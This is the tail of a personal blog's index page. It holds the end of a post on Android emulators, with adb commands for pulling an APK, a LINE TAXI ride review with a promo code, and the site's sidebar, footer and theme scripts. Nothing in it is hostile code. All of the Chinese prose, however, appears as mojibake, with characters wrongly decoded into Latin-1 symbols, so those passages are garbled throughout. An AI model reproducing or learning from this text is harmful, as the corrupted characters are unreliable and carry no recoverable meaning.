A : å…ˆç”¨ <code>pm path com.example.test_app</code> æ‰¾å‡º apk çš„è·¯å¾‘ï¼Œå†ç”¨ <code>adb pull /data/app/com.example.test_app.apk ./</code> æŠ“å‡ºä¾†</p>
<h2 id="å…¶ä»–çš„-Android-è™›æ“¬æ©Ÿ"><a class="header-anchor" href="#å…¶ä»–çš„-Android-è™›æ“¬æ©Ÿ"></a>å…¶ä»–çš„ Android è™›æ“¬æ©Ÿ</h2>
<p>å¦‚æœä½ åªæ˜¯æƒ³ç©éŠæˆ²çš„è©±ï¼Œå¯ä»¥åƒè€ƒä¸‹é¢å¹¾æ¬¾æ¨¡æ“¬å™¨</p>
<ol>
<li><a href="https://www.bluestacks.com/">BlueStacks</a></li>
<li><a href="https://www.bignox.com/">NoxPlayer ( å¤œç¥æ¨¡æ“¬å™¨ )</a></li>
<li><a href="https://memuplay.com/">MemuPlay ( é€é™æ¨¡æ“¬å™¨ )</a></li>
<li>ç­‰ç­‰</li>
</ol>

        </div>
        
        
        <div class="level is-mobile readmore-button">
            <div class="level-start">
                <div class="level-item">
                <a class="button is-size-7 is-light" href="/2020/02/15/security/reverse/android-emulator/#more">Read More</a>
                </div>
            </div>
        </div>
        
        
    </div>
</div>








    
<div class="card card-readmore">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2020-02-15T14:25:17.000Z">2020-02-15</time>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    2 minutes read (About 328 words)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2020/02/15/line-taxi/">ã€å¯¦æ¸¬ã€‘LINE TAXI ä¹˜è»Šé«”é©— - è¼¸å…¥ã€ŒATAAKHã€å„ªæƒ åºè™Ÿ ç¾æŠ˜ 50 å…ƒ</a>
            
        </h1>
        <div class="content">
            <p>LINE TAXI å°±æ˜¯è¨ˆç¨‹è»Šçš„å«è»Šå¹³å°ï¼Œæ‰€ä»¥å«ä¾†çš„æœƒæ˜¯è¨ˆç¨‹è»Šï¼Œåªè¦åŠ  <a href="https://line.me/R/ti/p/@linetaxi">@linetaxi</a> å¥½å‹ï¼Œå°±å¯ä»¥é–‹å§‹å«è»Šäº†ã€‚</p>
<p>æˆ‘ä¸€ç›´éƒ½æ˜¯ Uber çš„å¿ å¯¦ç”¨æˆ¶ï¼Œæ˜¨å¤©æƒ³èªªä¾†ç”¨ç”¨çœ‹ LINE TAXIï¼Œå› ç‚º LINE TAXI çš„åƒ¹æ ¼æ¯”è¼ƒä¾¿å®œï¼Œä½†å¯èƒ½æ˜¯å› ç‚ºå«è»Šçš„æ™‚é–“æ˜¯æ™šä¸Šä¹é»ï¼Œè€Œä¸”å«è»Šçš„åœ°é»é›¢å¸‚ä¸­å¿ƒæœ‰ä¸€é»è·é›¢ï¼Œæ‰€ä»¥ Uber æ¯”è¼ƒè²´è¦ 155 å…ƒï¼Œè€Œ LINE TAXI é ä¼°çš„åƒ¹æ ¼åªæœ‰ 120 - 130 å…ƒã€‚</p>
<p>ä½¿ç”¨é«”é©—å’Œ Uber åŸºæœ¬ä¸Šå·®ä¸å¤šï¼Œä¸éé‚„æ˜¯æœ‰ä¸€äº›ä¸åŒï¼Œæ¯”å¦‚</p>
<ul>
<li>LINE TAXI é¡¯ç¤ºçš„åƒ¹æ ¼æ˜¯é ä¼°åƒ¹æ ¼ï¼Œä½†é‚„æ˜¯è¦ä»¥è¨ˆç¨‹è»Šå¯¦éš›è·³è¡¨çš„åƒ¹æ ¼ç‚ºä¸»</li>
<li>è¨ˆç¨‹è»Šå¸æ©Ÿé€šå¸¸è©±å¾ˆå¤šï¼Œå’Œ Uber å¸æ©Ÿæ¯”èµ·ä¾†</li>
</ul>
<h2 id="LINE-TAXI-çš„å„ªé»"><a class="header-anchor" href="#LINE-TAXI-çš„å„ªé»"></a>LINE TAXI çš„å„ªé»</h2>
<ul>
<li>å„ªæƒ å¤š : é™¤äº†é¦–ä¹˜æŠ˜ 100 å…ƒä¹‹å¤–ï¼Œæ¬¡ä¹˜å†æŠ˜ 30 å…ƒï¼Œè€Œä¸”æ¯å¤©éƒ½å¯ä»¥æŠ½ä¹˜è»Šåˆ¸ï¼Œæˆ‘éƒ½æŠ½åˆ°ä¹æŠ˜ä¹˜è»Šåˆ¸ï¼Œä¸çŸ¥é“æœ‰æ²’æœ‰åˆ¥çš„</li>
<li>å¯ä»¥ç¶ä¿¡ç”¨å¡æˆ– APPLE PAY æˆ– LINE PAY æˆ– GOOGLE PAYï¼Œä¹Ÿå¯ä»¥ä»˜ç¾</li>
</ul>
<h2 id="LINE-TAXI-çš„ç¼ºé»"><a class="header-anchor" href="#LINE-TAXI-çš„ç¼ºé»"></a>LINE TAXI çš„ç¼ºé»</h2>
<ul>
<li>ä¸æ˜¯ä¸€å€‹ç¨ç«‹çš„ appï¼Œæ˜¯ LINE è£¡é¢çš„èŠå¤©æ©Ÿå™¨äºº</li>
<li>è¨ˆç¨‹è»Šå¸æ©Ÿè©±æ¯”è¼ƒå¤šï¼Œæˆ‘åªæƒ³è¦å®‰éœçš„æ­è»Šè»Š</li>
</ul>

        </div>
        
        
        <div class="level is-mobile readmore-button">
            <div class="level-start">
                <div class="level-item">
                <a class="button is-size-7 is-light" href="/2020/02/15/line-taxi/#more">Read More</a>
                </div>
            </div>
        </div>
        
        
    </div>
</div>









    
<div class="card card-transparent">
    <nav class="pagination is-centered" role="navigation" aria-label="pagination">
        <div class="pagination-previous is-invisible is-hidden-mobile">
            <a class="is-flex-grow has-text-black-ter" href="/page/0/">Previous</a>
        </div>
        <div class="pagination-next">
            <a class="is-flex-grow has-text-black-ter" href="/page/2/">Next</a>
        </div>
        <ul class="pagination-list is-hidden-mobile">
            
            <li><a class="pagination-link is-current" href="/">1</a></li>
            
            <li><a class="pagination-link has-text-black-ter" href="/page/2/">2</a></li>
            
            <li><a class="pagination-link has-text-black-ter" href="/page/3/">3</a></li>
            
        </ul>
    </nav>
</div>
</div>
                




<div class="column is-3-tablet is-3-desktop is-3-widescreen  has-order-1 column-left ">
    
        
<div class="card widget">
    <div class="card-content">
        <nav class="level">
            <div class="level-item has-text-centered" style="flex-shrink: 1">
                <div>
                    
                    <figure class="image is-128x128 has-mb-6">
                        <img class="is-rounded" src="https://www.gravatar.com/avatar/dd413429dc0e386a4dfdb890e39dd038?s=512" alt="oalieno">
                    </figure>
                    
                    <p class="is-size-4 is-block">
                        oalieno
                    </p>
                    
                    
                    
                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
                        <i class="fas fa-map-marker-alt has-mr-7"></i>
                        <span>Taiwan</span>
                    </p>
                    
                </div>
            </div>
        </nav>
        <nav class="level is-mobile">
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        Posts
                    </p>
                    <a href="/archives">
                        <p class="title has-text-weight-normal">
                            24
                        </p>
                    </a>
                </div>
            </div>
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        Categories
                    </p>
                    <a href="/categories">
                        <p class="title has-text-weight-normal">
                            8
                        </p>
                    </a>
                </div>
            </div>
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        Tags
                    </p>
                    <a href="/tags">
                        <p class="title has-text-weight-normal">
                            41
                        </p>
                    </a>
                </div>
            </div>
        </nav>
        
        <div class="level">
            <a class="level-item button is-link is-rounded" href="https://github.com/oalieno" target="_blank" rel="noopener" style="border-radius: 3px">
                Follow</a>
        </div>
        
        
        
        <div class="level is-mobile">
            
            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
                title="Github" href="https://github.com/oalieno">
                
                <i class="fab fa-github"></i>
                
            </a>
            
            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
                title="Ig" href="https://www.instagram.com/oalieno">
                
                <i class="fab fa-ig"></i>
                
            </a>
            
            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
                title="In" href="https://www.linkedin.com/in/oalieno/">
                
                <i class="fab fa-linkedin"></i>
                
            </a>
            
        </div>
        
    </div>
</div>
    
        
    
        
<div class="card widget">
    <div class="card-content">
        <div class="menu">
            <h3 class="menu-label">
                Categories
            </h3>
            <ul class="menu-list">
            <li>
        <a class="level is-marginless" href="/categories/algorithm/">
            <span class="level-start">
                <span class="level-item">algorithm</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">1</span>
            </span>
        </a></li><li>
        <a class="level is-marginless" href="/categories/blockchain/">
            <span class="level-start">
                <span class="level-item">blockchain</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">1</span>
            </span>
        </a></li><li>
        <a class="level is-marginless" href="/categories/security/">
            <span class="level-start">
                <span class="level-item">security</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">13</span>
            </span>
        </a><ul><li>
        <a class="level is-marginless" href="/categories/security/news/">
            <span class="level-start">
                <span class="level-item">news</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">1</span>
            </span>
        </a></li><li>
        <a class="level is-marginless" href="/categories/security/osint/">
            <span class="level-start">
                <span class="level-item">osint</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">1</span>
            </span>
        </a></li><li>
        <a class="level is-marginless" href="/categories/security/pwn/">
            <span class="level-start">
                <span class="level-item">pwn</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">3</span>
            </span>
        </a></li><li>
        <a class="level is-marginless" href="/categories/security/reverse/">
            <span class="level-start">
                <span class="level-item">reverse</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">3</span>
            </span>
        </a></li><li>
        <a class="level is-marginless" href="/categories/security/writeups/">
            <span class="level-start">
                <span class="level-item">writeups</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">5</span>
            </span>
        </a></li></ul></li>
            </ul>
        </div>
    </div>
</div>
    
        <div class="card widget">
    <div class="card-content">
        <h3 class="menu-label">
            Tag Cloud
        </h3>
        <a href="/tags/LINE-TAXI/" style="font-size: 10px;">LINE TAXI</a> <a href="/tags/adb/" style="font-size: 10px;">adb</a> <a href="/tags/algorithm/" style="font-size: 10px;">algorithm</a> <a href="/tags/android/" style="font-size: 13.33px;">android</a> <a href="/tags/blockchain/" style="font-size: 11.67px;">blockchain</a> <a href="/tags/burp/" style="font-size: 10px;">burp</a> <a href="/tags/command/" style="font-size: 10px;">command</a> <a href="/tags/crypto/" style="font-size: 10px;">crypto</a> <a href="/tags/ctf/" style="font-size: 18.33px;">ctf</a> <a href="/tags/dapper-labs/" style="font-size: 10px;">dapper labs</a> <a href="/tags/drony/" style="font-size: 10px;">drony</a> <a href="/tags/flow/" style="font-size: 10px;">flow</a> <a href="/tags/frida/" style="font-size: 11.67px;">frida</a> <a href="/tags/gdb/" style="font-size: 10px;">gdb</a> <a href="/tags/hexo/" style="font-size: 13.33px;">hexo</a> <a href="/tags/icarus/" style="font-size: 13.33px;">icarus</a> <a href="/tags/iterm2/" style="font-size: 10px;">iterm2</a> <a href="/tags/kernel/" style="font-size: 10px;">kernel</a> <a href="/tags/netflix/" style="font-size: 10px;">netflix</a> <a href="/tags/news/" style="font-size: 10px;">news</a> <a href="/tags/nord/" style="font-size: 10px;">nord</a> <a href="/tags/nox/" style="font-size: 10px;">nox</a> <a href="/tags/osint/" style="font-size: 10px;">osint</a> <a href="/tags/powerlevel10k/" style="font-size: 10px;">powerlevel10k</a> <a href="/tags/powerlevel9k/" style="font-size: 10px;">powerlevel9k</a> <a href="/tags/proxy/" style="font-size: 10px;">proxy</a> <a href="/tags/pwn/" style="font-size: 15px;">pwn</a> <a href="/tags/pyc/" style="font-size: 10px;">pyc</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/reverse/" style="font-size: 15px;">reverse</a> <a href="/tags/reverse-ssh/" style="font-size: 10px;">reverse ssh</a> <a href="/tags/rootkit/" style="font-size: 10px;">rootkit</a> <a href="/tags/rsa/" style="font-size: 10px;">rsa</a> <a href="/tags/security/" style="font-size: 20px;">security</a> <a href="/tags/seo/" style="font-size: 10px;">seo</a> <a href="/tags/srop/" style="font-size: 10px;">srop</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/tunnel/" style="font-size: 10px;">tunnel</a> <a href="/tags/writeups/" style="font-size: 16.67px;">writeups</a> <a href="/tags/zimfw/" style="font-size: 10px;">zimfw</a> <a href="/tags/zsh/" style="font-size: 10px;">zsh</a>
    </div>
</div>
    
        <div class="card widget">
    <div class="card-content">
        <h3 class="menu-label">
            Recent
        </h3>
        
        <article class="media">
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2021-02-26T16:06:00.000Z">2021-02-27</time></div>
                    <a href="/2021/02/27/blockchain/flow/" class="title has-link-black-ter is-size-6 has-text-weight-normal">ã€é …ç›®ä»‹ç´¹ã€‘Flow ( Dapper Labs )</a>
                    <p class="is-size-7 is-uppercase">
                        <a class="has-link-grey -link" href="/categories/blockchain/">blockchain</a>
                    </p>
                </div>
            </div>
        </article>
        
        <article class="media">
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-08-16T08:24:04.000Z">2020-08-16</time></div>
                    <a href="/2020/08/16/security/news/clipboard-hijack/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Clipboard hijacking cryptocurrency malware on tradingview.com</a>
                    <p class="is-size-7 is-uppercase">
                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/news/">news</a>
                    </p>
                </div>
            </div>
        </article>
        
        <article class="media">
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-07-30T16:29:25.000Z">2020-07-31</time></div>
                    <a href="/2020/07/31/security/osint/maltego/" class="title has-link-black-ter is-size-6 has-text-weight-normal">ã€å°å·¥å…·ã€‘Maltego</a>
                    <p class="is-size-7 is-uppercase">
                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/osint/">osint</a>
                    </p>
                </div>
            </div>
        </article>
        
        <article class="media">
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-06-09T14:29:00.000Z">2020-06-09</time></div>
                    <a href="/2020/06/09/security/writeups/ais3-2020-preexam/" class="title has-link-black-ter is-size-6 has-text-weight-normal">ã€Writeupsã€‘AIS3 pre-exam 2020</a>
                    <p class="is-size-7 is-uppercase">
                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/writeups/">writeups</a>
                    </p>
                </div>
            </div>
        </article>
        
        <article class="media">
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-05-04T06:33:13.000Z">2020-05-04</time></div>
                    <a href="/2020/05/04/security/writeups/f-hash/" class="title has-link-black-ter is-size-6 has-text-weight-normal">ã€Writeupsã€‘VolgaCTF Quals 2020 - F-Hash</a>
                    <p class="is-size-7 is-uppercase">
                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/writeups/">writeups</a>
                    </p>
                </div>
            </div>
        </article>
        
    </div>
</div>
    
        <div class="card widget">
    <div class="card-content">
        <div class="menu">
        <h3 class="menu-label">
            Archives
        </h3>
        <ul class="menu-list">
        
        <li>
            <a class="level is-marginless" href="/archives/2021/02/">
                <span class="level-start">
                    <span class="level-item">February 2021</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2020/08/">
                <span class="level-start">
                    <span class="level-item">August 2020</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2020/07/">
                <span class="level-start">
                    <span class="level-item">July 2020</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2020/06/">
                <span class="level-start">
                    <span class="level-item">June 2020</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2020/05/">
                <span class="level-start">
                    <span class="level-item">May 2020</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2020/03/">
                <span class="level-start">
                    <span class="level-item">March 2020</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2020/02/">
                <span class="level-start">
                    <span class="level-item">February 2020</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">5</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2020/01/">
                <span class="level-start">
                    <span class="level-item">January 2020</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">2</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2019/09/">
                <span class="level-start">
                    <span class="level-item">September 2019</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2019/06/">
                <span class="level-start">
                    <span class="level-item">June 2019</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">3</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2019/05/">
                <span class="level-start">
                    <span class="level-item">May 2019</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2019/04/">
                <span class="level-start">
                    <span class="level-item">April 2019</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">2</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2019/03/">
                <span class="level-start">
                    <span class="level-item">March 2019</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">2</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2018/11/">
                <span class="level-start">
                    <span class="level-item">November 2018</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2018/08/">
                <span class="level-start">
                    <span class="level-item">August 2018</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        </ul>
        </div>
    </div>
</div>
    
    
        <div class="column-right-shadow is-hidden-widescreen ">
        
        </div>
    
</div>

                
            </div>
        </div>
    </section>
    <footer class="footer">
    <div class="container">
        <div class="level">
            <div class="level-start has-text-centered-mobile">
                <a class="footer-logo is-block has-mb-6" href="/">
                
                    oalieno blog
                
                </a>
                <p class="is-size-7">
                &copy; 2021 oalieno&nbsp;
                Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> & <a
                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a>
                
                <br>
                <span id="busuanzi_container_site_uv">
                Visited by <span id="busuanzi_value_site_uv">0</span> users
                </span>
                
                </p>
            </div>
            <div class="level-end">
            
                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
                
                <p class="control">
                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/">
                        
                        <i class="fab fa-creative-commons"></i>
                        
                    </a>
                </p>
                
                <p class="control">
                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
                        
                        <i class="fab fa-creative-commons-by"></i>
                        
                    </a>
                </p>
                
                <p class="control">
                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/oalieno/oalieno.github.io">
                        
                        <i class="fab fa-github"></i>
                        
                    </a>
                </p>
                
                </div>
            
            </div>
        </div>
    </div>
</footer>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
<script>moment.locale("en");</script>


<script>
var IcarusThemeSettings = {
    site: {
        url: 'https://oalieno.github.io',
        external_link: {"enable":true,"exclude":[]}
    },
    article: {
        highlight: {
            clipboard: true,
            fold: 'unfolded'
        }
    },
    github: {
        url: 'https://github.com/oalieno/oalieno.github.io'
    }
};
</script>


<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>





<script src="/js/animation.js"></script>



<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
<script src="/js/gallery.js" defer></script>



<div id="outdated">
    <h6>Your browser is out-of-date!</h6>
    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
            my browser now </a></p>
    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
</div>
<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
<script>
    document.addEventListener("DOMContentLoaded", function () {
        outdatedBrowser({
            bgColor: '#f25648',
            color: '#ffffff',
            lowerThan: 'flex'
        });
    });
</script>


<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    MathJax.Hub.Config({
        'HTML-CSS': {
            matchFontHeight: false
        },
        SVG: {
            matchFontHeight: false
        },
        CommonHTML: {
            matchFontHeight: false
        },
        tex2jax: {
            inlineMath: [
                ['$','$'],
                ['\\(','\\)']
            ]
        }
    });
});
</script>


<a id="bottom-to-top" title="plugin.bottomtotop" href="javascript:;">
    <i class="fas fa-chevron-up"></i>
</a>
<script src="/js/bottom-to-top.js" defer></script>













<script src="/js/main.js" defer></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.2.0/lazysizes.min.js" defer></script>

    
    <div class="searchbox ins-search">
    <div class="searchbox-container ins-search-container">
        <div class="searchbox-input-wrapper">
            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="searchbox-result-wrapper ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                POSTS: 'Posts',
                PAGES: 'Pages',
                CATEGORIES: 'Categories',
                TAGS: 'Tags',
                UNTITLED: '(Untitled)',
            },
            CONTENT_URL: '/content.json',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>
<script src="/js/insight.js" defer></script>
<link rel="stylesheet" href="/css/search.css">
<link rel="stylesheet" href="/css/insight.css">
    
</body>
</html>